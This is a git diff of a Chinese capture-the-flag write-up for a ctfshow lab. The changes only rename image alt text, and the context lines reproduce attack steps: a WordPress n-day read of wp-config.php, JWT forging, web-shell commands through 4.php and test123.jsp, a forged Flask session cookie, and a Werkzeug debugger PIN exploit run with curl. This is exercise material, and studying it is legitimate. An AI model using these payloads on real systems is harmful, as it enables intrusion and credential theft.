@@ -23,9 +23,9 @@ ctfshow{654321}
 
 上一题里面有一张图片，我们放在010里面来做
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 ```python
 if __name__ == '__main__':
@@ -287,7 +287,7 @@ Allow: /wp-admin/admin-ajax.php
 
 WP，直接NDAY一个，`?aam-media=wp-config.php`
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 ```
 ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}
@@ -297,11 +297,11 @@ ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}
 
 登录一下情报网站，
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 发现了这个东西`4a4f7d6e8b5???0c7f`，那必须要破解一下才可以，但是要有个参照物啊，抓包什么的，最后F12找到jwt
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 
 
@@ -311,11 +311,11 @@ ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}
 
 原来这东西这么好用，我去了，牛
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 改一下jwt，刷新抓包
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 访问`/getPhone`
 
@@ -323,7 +323,7 @@ ctfshow{hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05}
 
 我们把jwt换进去，但是不是很好换，建议还是抓包来换，换了之后就点forward这样子，换完之后发现
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 抓包挨个看看发现两个路由可以用
 
@@ -417,11 +417,11 @@ if __name__ == '__main__':
 
 ## 横向渗透
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
 拿到IP，那可以对这整个网段进行爆破`172.2.199.4`
 
-![1](./assets/010.jpg)
+![image](./assets/010.jpg)
 
 汇总一下是怎么回事
 
@@ -492,7 +492,7 @@ http://172.2.195.5/4.php?1=whoami
 
 要读取**log_server_key.txt**，我们之前知道有个flask服务在一个服务器上面，放到本地草草的看了一下
 
-![1](./assets/011.jpg)
+![image](./assets/011.jpg)
 
 出了好几道flask的题了，伪造一个session访问就可以拿到
 
@@ -510,11 +510,11 @@ http://172.2.142.5/4.php?1=curl -H 'Cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9qFNA
 
 让我RCE意思是，注意看Debug为true，应该是能打pin的
 
-![1](./assets/012.jpg)
+![image](./assets/012.jpg)
 
 之前SHCTF里面涉及的还是flask来打，其中需要来调用一个Cookie来表示本地，但是现在貌似是Werkzeug里面的pin来的，跟进进来
 
-![1](./assets/013.jpg)
+![image](./assets/013.jpg)
 
 需要secret，我们先设置日志来记录flask
 
@@ -545,7 +545,7 @@ curl 'http://172.2.195.6:8888/get_log_content?logFile=main.log' --cookie "sessio
 curl 'http://172.2.195.6:8888/set_log_option?__debugger__=yes%2526cmd=pinauth%2526pin=129-773-657%2526s=xhFaxvHFZatNvMdOjdhI' --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z9q9SQ.LVZ6X-o6NqpT6hOKgxHQhvFhWQg" -i
 ```
 
-![1](./assets/014.jpg)
+![image](./assets/014.jpg)
 
 爆出Cookie，` __wzd8ebaf5167de8bca404e8=1742388963|e4901d753a95;`，RCE就完了
 
@@ -666,7 +666,7 @@ getcap -r / 2>/dev/null
 http://172.2.245.7:8080/test123.jsp?cmd=getcap%20-r%20/%202>/dev/null>/opt/jetty/webapps/ROOT/4.txt
 ```
 
-![1](./assets/015.jpg)
+![image](./assets/015.jpg)
 
 发现Java有setuid权限，
 
